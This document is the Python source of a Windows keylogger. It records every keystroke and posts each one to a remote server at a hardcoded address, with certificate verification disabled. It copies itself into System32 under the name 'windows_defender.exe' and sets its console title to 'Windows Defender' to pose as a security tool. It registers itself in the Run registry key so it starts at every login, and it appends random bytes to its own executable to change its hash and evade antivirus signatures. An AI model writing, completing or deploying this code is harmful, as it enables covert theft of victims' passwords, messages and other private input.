from pynput.keyboard import Listener
import requests
import random
import os
import sys
import shutil
import winreg as reg
import ctypes

# Blank line for morphing

# Server URL with HTTPS
server_url = 'https://192.168.86.229:5000/log'

def send_data(key):
    try:
        # Send the keystroke data over HTTPS
        requests.post(server_url, data={'keystroke': str(key)}, verify=False)
    except Exception as e:
        print(f"Failed to send data: {e}")

def on_press(key):
    send_data(key)

def main():
    # Start the keylogger
    with Listener(on_press=on_press) as listener:
        listener.join()

def add_to_startup(exe_name, exe_path):
    # Add the executable to the registry to run at startup
    key = reg.HKEY_CURRENT_USER
    key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
    
    key_obj = reg.OpenKey(key, key_value, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(key_obj, exe_name, 0, reg.REG_SZ, exe_path)
    reg.CloseKey(key_obj)

def mutate_executable():
    exe_path = sys.executable  

    # Append a random byte to the end of the executable to change its hash
    with open(exe_path, 'ab') as f:
        f.write(bytes([random.randint(0, 255)]))

    # Make a copy of the mutated executable with a new name
    new_exe_path = exe_path.replace('.exe', f'_{random.randint(1000, 9999)}.exe')
    shutil.copyfile(exe_path, new_exe_path)

    # Replace the original executable with the mutated one
    os.replace(new_exe_path, exe_path)

def rename_process(new_name):
    # Change the process name to something inconspicuous
    ctypes.windll.kernel32.SetConsoleTitleW(new_name)

def move_to_system32():
    # Retrieve the SYSTEMROOT environment variable, which points to the Windows directory
    system32_path = os.path.join(os.getenv('SYSTEMROOT'), 'System32')
    exe_name = "windows_defender.exe"  # Inconspicuous name
    hidden_path = os.path.join(system32_path, exe_name)

    # Ensure the System32 directory exists
    if not os.path.exists(system32_path):
        raise Exception(f"System32 directory not found at {system32_path}")

    # Move the executable to the System32 location
    if not os.path.exists(hidden_path):
        shutil.copyfile(sys.executable, hidden_path)

    # Return the path where the file was copied
    return hidden_path


if __name__ == "__main__":
    exe_name = "Windows Defender"  

    # Move the executable to the System32 directory
    hidden_exe_path = move_to_system32()

    # Rename the process to something inconspicuous
    rename_process(exe_name)

    # Add the hidden executable to startup using the fixed path in System32
    add_to_startup(exe_name, hidden_exe_path)

    # Mutate the executable to change its hash
    mutate_executable()

    # Start the keylogger
    main()
